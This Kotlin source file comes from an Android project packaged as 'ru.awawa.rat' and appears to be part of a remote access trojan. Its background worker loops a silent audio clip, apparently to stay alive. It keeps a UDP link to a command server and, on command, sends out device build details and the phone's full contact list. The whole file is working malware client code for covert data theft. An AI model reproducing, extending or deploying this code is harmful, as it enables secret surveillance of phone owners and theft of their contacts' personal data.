package ru.awawa.rat.worker

import android.content.Context
import android.media.MediaPlayer
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import ru.awawa.rat.R
import ru.awawa.rat.helper.BuildInfo
import ru.awawa.rat.helper.ContactsHelper
import ru.awawa.rat.helper.Preferences
import ru.awawa.rat.worker.helper.State
import ru.awawa.rat.worker.helper.protocol.*
import java.net.*
import java.util.*


class BackgroundWorker(context: Context, workerParams: WorkerParameters):
        Worker(context, workerParams) {

    companion object {
        private const val TAG = "BackgroundWorker"
        private const val CONNECTION_TIMEOUT = 60000L
    }

    private var mediaPlayer = MediaPlayer.create(context, R.raw.silence)

    private val socket = DatagramSocket()
    private val state = State()

    override fun doWork(): Result {
        this.state.connect(InetAddress.getByName("10.0.2.2"), 43584)
        socket.soTimeout = 1

        val buffer = ByteArray(BUFFER_SIZE)
        val rcvPacket = DatagramPacket(buffer, BUFFER_SIZE)

        mediaPlayer.start()

        while (state.running) {
            try {
                socket.receive(rcvPacket)
                this.processPacket(rcvPacket)
            } catch (ex: SocketTimeoutException) {
                this.sleep()
            }
        }

        mediaPlayer.stop()
        mediaPlayer.release()

        return Result.retry()
    }

    override fun onStopped() {
        super.onStopped()
        this.state.running = false
    }

    private fun processPacket(datagramPacket: DatagramPacket) {
        val packet = PacketHelper.create(datagramPacket.data) ?: return

        when (packet.magicNumber) {

            MagicNumber.START -> {
                val id = (packet as StartPacket).id
                Preferences.set(Preferences.PreferencesField.ID, id)
                Log.w(TAG, "Setting id to preferences: $id")
                this.state.id = id
                val pckt = PhoneInfoPacket(this.state.id, BuildInfo.getInfo())
                this.state.setStateConnected()

                this.socket.send(DatagramPacket(
                        pckt.data,
                        pckt.data.size,
                        this.state.serverAddress, this.state.serverPort
                ))
            }

            MagicNumber.KEEP_ALIVE -> {
                val id = (packet as KeepAlivePacket).id
                if (id == this.state.id) {
                    this.state.onKeepAliveReceived()
                }
            }

            MagicNumber.PHONE_INFO -> {
                val id = (packet as PhoneInfoPacket).id
                if (id != this.state.id) return

                val pckt = PhoneInfoPacket(id, BuildInfo.getInfo())
                this.socket.send(DatagramPacket(pckt.data, pckt.data.size, datagramPacket.address, datagramPacket.port))
            }

            MagicNumber.CONTACTS -> {
                val id = (packet as ContactsPacket).id
                if (id != this.state.id) return

                val contacts = ContactsHelper.getContacts(this.applicationContext)
                val pckt = ContactsPacket(id, contacts)
                this.socket.send(DatagramPacket(pckt.data, pckt.data.size, datagramPacket.address, datagramPacket.port))
            }
        }
    }

    private fun sleep() {

        if (state.needToSendStartRequest()) {
            this.state.startSent()
            this.state.setStateWaiting()
            val id = Preferences.get(Preferences.PreferencesField.ID) ?: ""
            Log.w(TAG, "Getting id from preferences: $id")
            val buffer = StartPacket(id).data
            val packet = DatagramPacket(buffer, buffer.size, state.serverAddress, state.serverPort)

            this.socket.send(packet)
        }

        if (state.needToSendKeepAlive()) {
            this.state.keepAliveSent()
            val buffer = KeepAlivePacket(state.id).data
            val packet = DatagramPacket(buffer, buffer.size, state.serverAddress, state.serverPort)

            this.socket.send(packet)
            Log.w(TAG, "Keep alive sent")
        }

        if (Date().time - state.lastServerCheckIn > CONNECTION_TIMEOUT) {
            this.state.connect(this.state.serverAddress!!, this.state.serverPort)
        }

        Thread.sleep(500)
    }
}